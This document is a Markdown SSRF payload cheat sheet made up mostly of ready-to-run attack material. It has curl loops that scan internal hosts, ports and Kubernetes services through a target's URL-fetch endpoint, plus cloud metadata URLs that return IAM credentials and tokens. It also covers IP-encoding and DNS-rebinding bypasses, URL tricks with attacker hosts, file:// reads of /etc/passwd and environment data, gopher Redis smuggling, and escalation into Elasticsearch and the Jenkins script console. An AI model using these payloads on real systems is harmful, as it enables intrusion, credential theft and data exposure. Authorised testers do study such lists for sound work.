# SSRF Payloads Reference

## Localhost Access Variants

```bash
# Standard localhost
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

## Internal Network Scanning

```bash
# Scan common private ranges and ports
for ip in 127.0.0.1 10.0.0.1 172.16.0.1 192.168.1.1; do
  for port in 22 80 443 3000 3306 5432 6379 8080 8443 9200 27017; do
    echo -n "$ip:$port -> "
    response=$(curl -s --max-time 3 -X POST \
      -H "Content-Type: application/json" \
      -d "{\"url\":\"http://$ip:$port/\"}" \
      "https://target.example.com/api/fetch-url")
    echo "$response" | head -c 100
    echo
  done
done

# Kubernetes internal services
for svc in kubernetes.default.svc \
  kubernetes-dashboard.kubernetes-dashboard.svc \
  kube-dns.kube-system.svc; do
  curl -s --max-time 3 -X POST \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://$svc/\"}" \
    "https://target.example.com/api/fetch-url"
done

# Internal admin panels
for path in /admin /console /actuator/env /server-status /_cat/indices; do
  curl -s -X POST \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.0.0.1:8080$path\"}" \
    "https://target.example.com/api/fetch-url"
done
```

## Cloud Metadata Endpoints

```bash
# AWS EC2 Metadata (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns: AccessKeyId, SecretAccessKey, Token

# GCP (requires Metadata-Flavor: Google header)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (requires Metadata: true header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

## IP Address Encoding Bypasses

```bash
PAYLOADS=(
  "http://127.0.0.1/"
  "http://0177.0.0.1/"          # Octal
  "http://0x7f.0.0.1/"          # Hex
  "http://2130706433/"           # Decimal
  "http://127.1/"                # Short form
  "http://0/"                    # Zero
  "http://[::1]/"                # IPv6 loopback
  "http://0.0.0.0/"              # All interfaces
  "http://localtest.me/"         # DNS resolves to 127.0.0.1
  "http://127.0.0.1.nip.io/"    # Wildcard DNS
)

for payload in "${PAYLOADS[@]}"; do
  echo -n "$payload -> "
  curl -s -o /dev/null -w "%{http_code}" --max-time 3 \
    -X POST -H "Content-Type: application/json" \
    -d "{\"url\":\"$payload\"}" \
    "https://target.example.com/api/fetch-url"
  echo
done
```

## DNS Rebinding

```
Register a domain that alternates DNS responses:
  First resolution  -> external IP (passes allowlist check)
  Second resolution -> 127.0.0.1 (actual request hits internal)
Tools: rbndr.us, rebind.it, taviso/rbndr

http://7f000001.c0a80001.rbndr.us/
```

## URL Parsing Tricks

```
http://evil.com#@expected.com        # Fragment confusion
http://expected.com@evil.com         # Username in URL
http://evil.com/..;/internal         # Path traversal
http://127.0.0.%31/                  # URL encoding
http://attacker.com/redirect?url=http://127.0.0.1  # Open redirect chain
```

## Protocol Smuggling

```bash
# Local file read
file:///etc/passwd
file:///proc/self/environ

# Redis via gopher (raw TCP)
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a...

# Service detection via dict
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
```

## Webhook / POST Body Testing

```bash
# Test POST body with URL
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"url":"http://COLLABORATOR_ID.oast.fun/ssrf-test"}' \
  "https://target.example.com/api/fetch-url"

# Test webhook callback
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"webhook_url":"http://COLLABORATOR_ID.oast.fun/webhook"}' \
  "https://target.example.com/api/webhooks"
```

## Impact Escalation

```bash
# Access Elasticsearch
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:9200/_cat/indices?v"}' \
  "https://target.example.com/api/fetch-url"

# Read Elasticsearch data
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:9200/users/_search?size=10"}' \
  "https://target.example.com/api/fetch-url"

# Access internal Jenkins
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8080/script"}' \
  "https://target.example.com/api/fetch-url"

# Redis via gopher -- use Gopherus to generate payloads
python gopherus.py --exploit redis
```
